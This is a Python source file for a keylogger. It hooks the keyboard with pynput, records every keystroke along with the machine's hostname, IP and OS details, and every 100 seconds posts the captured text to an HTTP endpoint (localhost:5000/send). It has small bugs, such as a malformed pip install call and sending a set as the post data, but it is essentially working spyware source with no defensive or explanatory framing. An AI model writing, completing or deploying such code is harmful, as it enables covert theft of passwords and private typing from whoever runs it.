import sys
import os

if sys.version_info.major >= 3:
    try:
        import subprocess
        
        from pynput import keyboard
        import socket
        import platform
        import threading
        import json
        import requests
        data = ''


    except ModuleNotFoundError:
        packages = ["keyboard","pynput", "json", "requests"]
        for package in packages:
            subprocess.call("pip install -r requirements.txt")
            subprocess.call("pip install -r" + ' '.join(package))

    finally:
        USER_HOSTNAME = socket.gethostname()
        USER_IP = socket.gethostbyname(USER_HOSTNAME)
        USER_PROCESSOR = platform.processor()
        USER_SYSTEM = platform.system()
        USER_MACHINE = platform.machine()
        USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
        key_press_dict = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.alt_l: "",
            keyboard.Key.alt_r: "",
            keyboard.Key.ctrl: "_CTRL_",
            keyboard.Key.caps_lock: "_CAPS"
            }
        def return_data():
            send_data_interval = threading.Timer(100, return_data)
            send_data_interval.start()
            global data
            r = requests.post('http://localhost:5000/send', data={data})


               
        def on_press(key):
            global data
            if key in key_press_dict:
                data += key_press_dict.get(key)
            else:
                data += str(key).strip("'")


        with keyboard.Listener(on_press=on_press) as listener:
            return_data()
            listener.join()  
else:
    os._exit(0)
    

